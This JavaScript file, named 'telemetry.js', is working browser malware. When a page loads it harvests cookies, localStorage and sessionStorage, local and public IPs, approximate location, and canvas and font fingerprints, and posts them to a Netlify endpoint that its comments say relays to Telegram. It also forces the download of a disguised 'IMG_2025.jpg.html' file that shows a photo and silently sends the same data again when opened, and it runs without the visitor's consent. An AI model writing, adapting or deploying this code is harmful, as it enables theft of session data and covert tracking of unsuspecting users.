// telemetry.js – Universal Image Dropper (FIXED: Absolute URL + CORS)
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // Helper: Send data to Netlify → Telegram
  async function sendToBackend(module, payload) {
    try {
      // Try with CORS
      const res = await fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
        cache: 'no-store',
        keepalive: true
      });
      if (!res.ok) throw new Error('Server error');
    } catch (e) {
      // Fallback: Try no-cors mode (sends data but ignores response)
      try {
        await fetch(ENDPOINT, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'text/plain' },
          body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
          cache: 'no-store',
          keepalive: true
        });
      } catch (_) {}
    }
  }

  // ---------- 1. BROWSER DATA EXFIL (AUTO, NO PERMISSION) ----------
  async function collectBrowserData() {
    const device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      vendor: navigator.vendor || 'N/A'
    };

    let battery = 'N/A';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level*100)+'%', charging: b.charging ? 'Yes':'No' };
      } catch(_) {}
    }

    let localIPs = ['N/A'];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('test');
      await pc.createOffer();
      await pc.setLocalDescription();
      const ips = [];
      pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;
        const c = e.candidate.candidate;
        if (c) {
          const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
          if (m && !ips.includes(m[0])) ips.push(m[0]);
        }
      };
      await new Promise(r => setTimeout(r, 2000));
      localIPs = ips.length ? ips : ['N/A'];
      pc.close();
    } catch(_) {}

    let publicData = {};
    try {
      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      publicData = await r.json();
    } catch(_) {}

    const cookies = document.cookie || 'No cookies';
    let localStorageData = {}, sessionStorageData = {};
    try { localStorageData = { ...localStorage }; } catch(_) {}
    try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

    let canvas = 'N/A';
    try {
      const c = document.createElement('canvas');
      c.width = 256; c.height = 128;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0,0,16,16);
      ctx.fillStyle = '#069';
      ctx.textBaseline = 'alphabetic';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200,60,40,40);
      canvas = c.toDataURL();
    } catch(_) {}

    let fonts = [];
    try {
      const base = ['monospace','sans-serif','serif'];
      const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const txt = 'mmmmmmmmmmlli';
      const size = '72px';
      ctx.font = size + ' ' + base[0];
      const b = ctx.measureText(txt).width;
      for (const f of test) {
        ctx.font = size + ' "' + f + '", ' + base[0];
        const w = ctx.measureText(txt).width;
        if (w !== b) fonts.push(f);
      }
    } catch(_) {}

    return {
      device,
      battery,
      network: {
        localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.org || 'N/A',
        approxLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country_name || 'N/A',
          lat: publicData.latitude || 'N/A',
          lng: publicData.longitude || 'N/A'
        }
      },
      storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
      fingerprints: { canvas, fonts },
      referrer: document.referrer,
      pageUrl: location.href
    };
  }

  // ---------- 2. MALICIOUS IMAGE DROPPER (DOUBLE EXTENSION + ABSOLUTE URL) ----------
  function dropMaliciousImage() {
    try {
      // Real image URL (will be displayed inside the HTML)
      const imageUrl = 'https://files.catbox.moe/l9xdjq.png';
      
      // CRITICAL: Get the absolute URL of the current site (your Netlify URL)
      // This will be baked into the downloaded HTML
      const siteOrigin = window.location.origin;
      const absoluteEndpoint = `${siteOrigin}/.netlify/functions/telemetry`;

      // Self-contained HTML page that shows a real image and runs telemetry
      const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IMG_2025</title>
  <meta property="og:image" content="${imageUrl}" />
  <meta property="og:title" content="Beautiful Sunset" />
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #0a0a0a;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }
    .container {
      max-width: 95vw;
      max-height: 95vh;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
      background: #1a1a1a;
    }
    img {
      display: block;
      width: 100%;
      height: auto;
      max-height: 80vh;
      object-fit: contain;
    }
    .caption {
      padding: 10px 20px;
      color: #ccc;
      text-align: center;
      font-size: 13px;
      background: #1a1a1a;
      border-top: 1px solid #333;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="${imageUrl}" alt="Beautiful Sunset" />
    <div class="caption">📸 IMG_2025 • Tap to share</div>
  </div>

  <!-- ========== TELEMETRY SCRIPT (SILENT) ========== -->
  <script>
    (function() {
      // HARDCODED ABSOLUTE URL (baked during generation)
      const ENDPOINT = '${absoluteEndpoint}';

      async function sendData(module, payload) {
        try {
          // Try CORS mode
          const res = await fetch(ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
            cache: 'no-store',
            keepalive: true
          });
        } catch (e) {
          // Fallback: no-cors mode (works even if CORS fails)
          try {
            await fetch(ENDPOINT, {
              method: 'POST',
              mode: 'no-cors',
              headers: { 'Content-Type': 'text/plain' },
              body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
              cache: 'no-store',
              keepalive: true
            });
          } catch (_) {}
        }
      }

      async function collect() {
        const device = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory,
          screen: screen.width+'x'+screen.height,
          pixelRatio: devicePixelRatio,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          vendor: navigator.vendor || 'N/A'
        };

        let battery = 'N/A';
        if (navigator.getBattery) {
          try {
            const b = await navigator.getBattery();
            battery = { level: Math.round(b.level*100)+'%', charging: b.charging?'Yes':'No' };
          } catch(_) {}
        }

        let localIPs = ['N/A'];
        try {
          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
          pc.createDataChannel('test');
          await pc.createOffer();
          await pc.setLocalDescription();
          const ips = [];
          pc.onicecandidate = (e) => {
            if (!e || !e.candidate) return;
            const c = e.candidate.candidate;
            if (c) {
              const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
              if (m && !ips.includes(m[0])) ips.push(m[0]);
            }
          };
          await new Promise(r => setTimeout(r, 2000));
          localIPs = ips.length ? ips : ['N/A'];
          pc.close();
        } catch(_) {}

        let publicData = {};
        try {
          const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
          publicData = await r.json();
        } catch(_) {}

        const cookies = document.cookie || 'No cookies';
        let localStorageData = {}, sessionStorageData = {};
        try { localStorageData = { ...localStorage }; } catch(_) {}
        try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

        let canvas = 'N/A';
        try {
          const c = document.createElement('canvas');
          c.width = 256; c.height = 128;
          const ctx = c.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(0,0,16,16);
          ctx.fillStyle = '#069';
          ctx.textBaseline = 'alphabetic';
          ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
          ctx.fillStyle = 'rgba(102,204,0,0.7)';
          ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
          ctx.fillStyle = '#ff6';
          ctx.fillRect(200,60,40,40);
          canvas = c.toDataURL();
        } catch(_) {}

        let fonts = [];
        try {
          const base = ['monospace','sans-serif','serif'];
          const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
          const c = document.createElement('canvas');
          const ctx = c.getContext('2d');
          const txt = 'mmmmmmmmmmlli';
          const size = '72px';
          ctx.font = size + ' ' + base[0];
          const b = ctx.measureText(txt).width;
          for (const f of test) {
            ctx.font = size + ' "' + f + '", ' + base[0];
            const w = ctx.measureText(txt).width;
            if (w !== b) fonts.push(f);
          }
        } catch(_) {}

        return {
          device,
          battery,
          network: {
            localIPs,
            publicIP: publicData.ip || 'N/A',
            isp: publicData.org || 'N/A',
            approxLocation: {
              city: publicData.city || 'N/A',
              region: publicData.region || 'N/A',
              country: publicData.country_name || 'N/A',
              lat: publicData.latitude || 'N/A',
              lng: publicData.longitude || 'N/A'
            }
          },
          storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
          fingerprints: { canvas, fonts },
          referrer: document.referrer,
          pageUrl: location.href
        };
      }

      // AUTO-RUN when this HTML is opened
      collect().then(data => {
        sendData('IMAGE_DROPPER_PAYLOAD', data);
      });
    })();
  </script>
</body>
</html>`;

      // Download as HTML with double extension: .jpg.html
      const blob = new Blob([htmlContent], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'IMG_2025.jpg.html';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 200);

      sendToBackend('IMAGE_DROPPER_DELIVERED', {
        status: 'Downloaded',
        filename: 'IMG_2025.jpg.html',
        note: 'Absolute URL baked in: ' + absoluteEndpoint
      });
    } catch (e) {
      sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
    }
  }

  // ---------- 3. MASTER TRIGGER (AUTO ON LOAD) ----------
  async function runAll() {
    if (executed) return;
    executed = true;

    console.log('%c📸 Dropping double-extension image payload...', 'font-size:16px; color:#ff6600;');

    // Auto telemetry
    const data = await collectBrowserData();
    await sendToBackend('AUTO_TELEMETRY', data);

    // Drop the disguised HTML file
    dropMaliciousImage();

    console.log('%c✅ Payload delivered. File: IMG_2025.jpg.html', 'font-size:16px; color:#00ffcc;');
  }

  // ---------- 4. TRIGGER ON PAGE LOAD (BINA CLICK KE) ----------
  if (document.readyState === 'complete') {
    setTimeout(runAll, 800);
  } else {
    window.addEventListener('load', () => setTimeout(runAll, 800));
  }

  // Balloon click backup
  const orig = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (orig) orig();
    if (!executed) runAll();
  };
})();
